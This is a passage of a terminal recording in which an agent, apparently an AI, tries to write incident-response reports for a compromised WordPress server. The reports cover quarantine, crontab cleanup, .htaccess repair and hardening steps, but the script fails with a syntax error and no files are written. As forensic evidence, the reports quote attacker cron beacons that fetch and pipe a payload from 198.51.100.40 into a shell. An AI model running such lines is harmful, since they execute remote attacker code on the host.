[606.33849, "o", "- **Evidence:** In `/disk/var/www/html/wp-config.php:4`:\r\n\u001b[?2004l\r a\u001b[?2004h> "]
[606.33871, "o", "  `wp-config.php DB_PASSWORD is weak; XML-RPC enabled`\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.338794, "o", "- **Security Impact:** Weak database credentials and unthrottled XML-RPC interface expose the site to brute-force attacks and credential theft.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.339022, "o", "### Finding 2: Insecure System Crontab File Permissions\r\n\u001b[?2004l\r\u001b[?2004h> - **Check ID:** SYS-CRON-01\r\n\u001b[?2004l\r\r\n"]
[606.339033, "o", "\u001b[?2004h> - **Target File:** `/etc/crontab` (`/disk/etc/crontab:1`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.3392, "o", "- **Status:** **WARN**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.339228, "o", "- **Evidence:** File mode on `/disk/etc/crontab:1` is `0644` (`-r--r--r--`).\r\n\u001b[?2004l\r"]
[606.339294, "o", "\u001b[?2004h> "]
[606.339394, "o", "- **Security Impact:** World-readable crontabs expose administrative tasks to non-privileged users.\r\n\u001b[?2004l\r"]
[606.339483, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rt Sy\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.339609, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> ## 3. Remediation Recommendations\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[606.339698, "o", "> "]
[606.339905, "o", "1. Rotate WordPress database password and restrict `/var/www/html/wp-config.php` permissions to `0600` (`/disk/var/www/html/wp-config.php:1`).\r\n\u001b[?2004l\r"]
[606.340001, "o", "\u001b[?2004h> "]
[606.340088, "o", "2. Disable XML-RPC in WordPress via `.htaccess` or plugin configuration.\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.340169, "o", "> 3. Restrict `/etc/crontab` permissions to `0600` (`chmod 600 /etc/crontab`).\r\n\u001b[?2004l\r"]
[606.340192, "o", "\u001b[?2004h> \"\"\"\r\n\u001b[?2004l\rpe\u001b[?2004h> "]
[606.340283, "o", "with open(\"/app/baseline-report.md\", \"w\") as f:\r\n\u001b[?2004l\r\u001b[?2004h>     f.write(baseline)\r\n\u001b[?2004l\r"]
[606.340341, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rplu\u001b[?2004h> "]
[606.340417, "o", "remediation = \"\"\"# Incident Remediation & Recovery Action Plan\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.340507, "o", "**Incident ID:** INC-2024-0816-WP  \r\n\u001b[?2004l\rnd `/etc/cront\u001b[?2004h> "]
[606.340538, "o", "**Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.340583, "o", "**Author:** Lead DFIR Analyst  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\ro"]
[606.34059, "o", "\u001b[?2004h> ---\r\n\u001b[?2004l\rPr"]
[606.3407, "o", "\u001b[?2004h> \r\n\u001b[?2004l\re\u001b[?2004h> ## 1. Operating Principles & Compliance Guidelines\r\n\u001b[?2004l\rn-\u001b[?2004h> \r\n\u001b[?2004l\rp\u001b[?2004h> "]
[606.340855, "o", "This remediation plan guides system administrators through containment, eradication, hardening, and restoration of `wordpress-prod-01`.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n"]
[606.340964, "o", "\u001b[?2004l\r\u001b[?2004h> ### Operating Rules\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.341061, "o", "- **Quarantine over Deletion:** Back up all malicious artifacts and modified configuration files to `/root/forensic_quarantine/` before modification.\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.341137, "o", "> "]
[606.341205, "o", "- **Console Execution:** System administrators must run commands on the server console.\r\n\u001b[?2004l\r"]
[606.341263, "o", "\u001b[?2004h> "]
[606.34137, "o", "- **Verifiable Actions:** Every step includes concrete verification commands.\r\n\u001b[?2004l\r"]
[606.341433, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ---\r\n\u001b[?2004l\r"]
[606.341505, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.341736, "o", "## 2. Phase 1: Immediate Containment & Evidence Quarantine\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 1.1: Create Secure Forensic Quarantine Storage\r\n\u001b[?2004l\r\u001b[?2004h> - **Command:**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342044, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h>   mkdir -p /root/forensic_quarantine/20240816_incident\r\n\u001b[?2004l\r\u001b[?2004h>   chmod 700 /root/forensic_quarantine\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342182, "o", "- **Verification:** Run `ls -ld /root/forensic_quarantine` (Permissions must be `drwx------`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342198, "o", "### Step 1.2: Quarantine Vulnerable Plugin / Webshell\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342343, "o", "- **Evidence Citation:** `/disk/var/www/html/wp-content/plugins/contact/inc.php:1` (`/sas/alerts.json:4`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342435, "o", "- **Command:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342527, "o", "  mv /var/www/html/wp-content/plugins/contact /root/forensic_quarantine/20240816_incident/\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.342644, "o", "  chmod -R 000 /root/forensic_quarantine/20240816_incident/contact\r\n\u001b[?2004l\r"]
[606.342678, "o", "\u001b[?2004h>   ```\r\n\u001b[?2004l\r"]
[606.342749, "o", "\u001b[?2004h> "]
[606.342882, "o", "- **Verification:** Run `ls -la /var/www/html/wp-content/plugins/contact` (Must return `No such file or directory`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.342997, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.343013, "o", "### Step 1.3: Remove Persistent `www-data` Crontab\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.343159, "o", "- **Evidence Citation:** `/disk/var/spool/cron/crontabs/www-data:2` (`* * * * * ...curl...198.51.100.40/payload.sh`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34319, "o", "- **Command:**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34324, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.3433, "o", "  crontab -u www-data -l > /root/forensic_quarantine/20240816_incident/www-data.crontab.bak\r\n\u001b[?2004l\r"]
[606.343361, "o", "\u001b[?2004h>   crontab -u www-data -r\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34342, "o", "- **Verification:** Run `crontab -u www-data -l` (Must return `no crontab for www-data`).\r\n\u001b[?2004l\r"]
[606.343458, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.343502, "o", "### Step 1.4: Remove Persistent `root` Crontab Beacon\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.343595, "o", "- **Evidence Citation:** `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)\r\n\u001b[?2004l\r"]
[606.343655, "o", "\u001b[?2004h> - **Command:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.343774, "o", "  cp /etc/crontab /root/forensic_quarantine/20240816_incident/crontab.bak\r\n\u001b[?2004l\r\u001b[?2004h>   sed -i \"/198.51.100.40/d\" /etc/crontab\r\n\u001b[?2004l\r"]
[606.343843, "o", "\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344052, "o", "- **Verification:** Inspect `/etc/crontab` to ensure beacon entry is removed.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 1.5: Revert Malicious `.htaccess` Traffic Redirection\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344189, "o", "- **Evidence Citation:** `/disk/var/www/html/.htaccess:2` (`.htaccess RewriteRule redirect of all traffic to 198.51.100.40`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344222, "o", "- **Command:**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344291, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344413, "o", "  cp /var/www/html/.htaccess /root/forensic_quarantine/20240816_incident/.htaccess.bak\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.34447, "o", "> "]
[606.344532, "o", "  sed -i \"/198.51.100.40/d\" /var/www/html/.htaccess\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344596, "o", "- **Verification:** Inspect `/var/www/html/.htaccess` and run test query:  \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344732, "o", "  `curl -I http://localhost/` (Should return 200 OK, not redirect).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344797, "o", "### Step 1.6: Remove Defacement Landing Page\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344867, "o", "- **Evidence Citation:** `/disk/var/www/html/index.html:1` (`/sas/alerts.json:11`)\r\n\u001b[?2004l\r"]
[606.344952, "o", "\u001b[?2004h> - **Command:**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.344962, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.345062, "o", "  mv /var/www/html/index.html /root/forensic_quarantine/20240816_incident/index.html.defaced\r\n\u001b[?2004l\r"]
[606.345159, "o", "\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34525, "o", "- **Verification:** Access `http://localhost/` and confirm normal WordPress site loads.\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.345307, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.345354, "o", "## 3. Phase 2: Host & Application Hardening\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.34538, "o", "> \r\n\u001b[?2004l\r"]
[606.34543, "o", "\u001b[?2004h> "]
[606.345471, "o", "### Step 2.1: Harden `wp-config.php` Configuration & DB Credentials\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.345628, "o", "- **Evidence Citation:** `/disk/var/www/html/wp-config.php:4` (`/sas/alerts.json:18`, `/sas/baseline.json:2`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.345763, "o", "- **Command:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.345845, "o", "  cp /var/www/html/wp-config.php /root/forensic_quarantine/20240816_incident/wp-config.php.bak\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34592, "o", "  chmod 0600 /var/www/html/wp-config.php"]
[606.346123, "o", "\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346153, "o", "- **Verification:** Verify `/var/www/html/wp-config.php` permissions are `0600`.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 2.2: Restrict System Crontab Permissions\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346201, "o", "- **Evidence Citation:** `/disk/etc/crontab:1` (`0644` permissions)\r\n\u001b[?2004l\r"]
[606.346296, "o", "\u001b[?2004h> - **Command:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346353, "o", "  chmod 0600 /etc/crontab\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.346395, "o", ">   chown root:root /etc/crontab\r\n\u001b[?2004l\r"]
[606.346467, "o", "\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346531, "o", "- **Verification:** Run `stat -c \"%a %U %G\" /etc/crontab` (Output must be `600 root root`)."]
[606.346563, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[606.346584, "o", "\u001b[?2004h> "]
[606.346644, "o", "## 4. Phase 3: Post-Remediation Monitoring\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346742, "o", "1. **Log Inspection:** Monitor `/var/log/nginx/access.log` for access attempts to plugin endpoints.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.34683, "o", "2. **Crontab Audits:** Periodically audit `/var/spool/cron/crontabs/` and `/etc/crontab` for unauthorized tasks.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.346929, "o", "3. **Core Verification:** Run `wp core verify-checksums` to confirm WordPress file integrity.\r\n\u001b[?2004l\r"]
[606.347029, "o", "\u001b[?2004h> \"\"\"\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.347059, "o", "with open(\"/app/remediation-plan.md\", \"w\") as f:\r\n\u001b[?2004l\r\u001b[?2004h>     f.write(remediation)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.347087, "o", "print(\"Files written successfully.\")\r\n\u001b[?2004l\r\u001b[?2004h> '\r\n\u001b[?2004l\r"]
[606.352307, "o", "  File \"<string>\", line 147\r\n    vuln = \"\"\"# Vulnerability Assessment & Entry Point Analysis Report\r\n           ^\r\nSyntaxError: unterminated triple-quoted string literal (detected at line 159)\r\n"]
[606.353583, "o", "\u001b[?2004hroot@3d46f201add4:/app# "]
[607.225048, "i", "ls -la /app\n"]
[607.225268, "o", "ls -la /app\r\n\u001b[?2004l\r"]
[607.226468, "o", "total 8\r\ndrwxr-xr-x 2 root root 4096 Aug 16 17:53 \u001b[0m\u001b[01;34m.\u001b[0m\r\ndrwxr-xr-x 1 root root 4096 Aug 16 17:53 \u001b[01;34m..\u001b[0m\r\n"]
[607.227434, "o", "\u001b[?2004h"]
[607.227449, "o", "root@3d46f201add4:/app# "]
